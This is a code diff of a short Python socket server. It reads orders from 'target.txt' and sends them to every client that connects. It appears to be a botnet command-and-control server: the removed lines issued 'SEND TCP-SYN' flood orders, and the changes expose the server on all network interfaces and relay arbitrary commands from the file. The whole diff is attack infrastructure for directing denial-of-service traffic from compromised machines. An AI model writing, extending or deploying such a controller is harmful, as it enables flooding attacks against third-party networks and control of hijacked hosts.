@@ -1,12 +1,12 @@
 import socket
 
 def send_response(message, client):
-    data = "{:<64}".format(message)
+    data = "{:<256}".format(message)
     client.send(data.encode("utf-8"))
 
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-server.bind(("localhost", 7323))
+server.bind(("0.0.0.0", 7323))
 
 server.listen(10)
 
@@ -15,10 +15,10 @@ while True:
 
     try:
         target_file = open("target.txt", "r")
-        target_data = target_file.read().split(" ")
+        target_command = target_file.read()
         target_file.close()
-        if len(target_data) == 3:
-            send_response(f'SEND TCP-SYN {target_data[0]} {target_data[1]} {target_data[2]}', client)
+        if len(target_command) >= 0:
+            send_response(target_command, client)
         else:
             send_response("NONE", client)
     except Exception as e:
